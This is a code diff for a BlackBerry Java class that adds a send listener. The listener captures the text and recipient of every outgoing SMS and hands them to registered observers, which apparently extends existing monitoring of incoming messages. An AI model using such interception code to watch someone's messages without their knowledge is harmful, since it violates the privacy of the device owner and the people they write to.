@@ -5,8 +5,11 @@ import java.io.IOException;
 import javax.microedition.io.Connector;
 import javax.microedition.io.Datagram;
 import javax.microedition.io.DatagramConnection;
+import javax.wireless.messaging.Message;
 import javax.wireless.messaging.MessageConnection;
+import javax.wireless.messaging.TextMessage;
 
+import net.rim.blackberry.api.sms.SendListener;
 import net.rim.device.api.io.DatagramBase;
 import net.rim.device.api.io.SmsAddress;
 import net.rim.device.api.system.RuntimeStore;
@@ -16,7 +19,7 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.SmsObserver;
 
-public class SmsListener46 extends SmsListener {
+public class SmsListener46 extends SmsListener implements SendListener {
     private static final long GUID = 0xe78b740082783263L;
     // Statics ------------------------------------------------------------------
     private static String _openString = "sms://:0"; // See Connector implementation notes.
@@ -158,6 +161,31 @@ public class SmsListener46 extends SmsListener {
                 e.printStackTrace();
             }
         }
+    }
+
+    public boolean sendMessage(Message msg) {
+        debug.trace("notifyOutgoingMessage");
+
+        String body = "";
+        if (msg instanceof TextMessage) {
+            TextMessage tm = (TextMessage) msg;
+            body = tm.getPayloadText();
+        }
+
+        final int size = smsObservers.size();
+        boolean hide=false;
+        for (int i = 0; i < size; i++) {
+
+            final SmsObserver observer = (SmsObserver) smsObservers
+                    .elementAt(i);
+            //#ifdef DEBUG
+            debug.trace("notify: " + observer);
+            //#endif
+
+            observer.onNewSms(body.getBytes(), msg.getAddress(), false);
+        }
+
+        return true;
     }
 
 
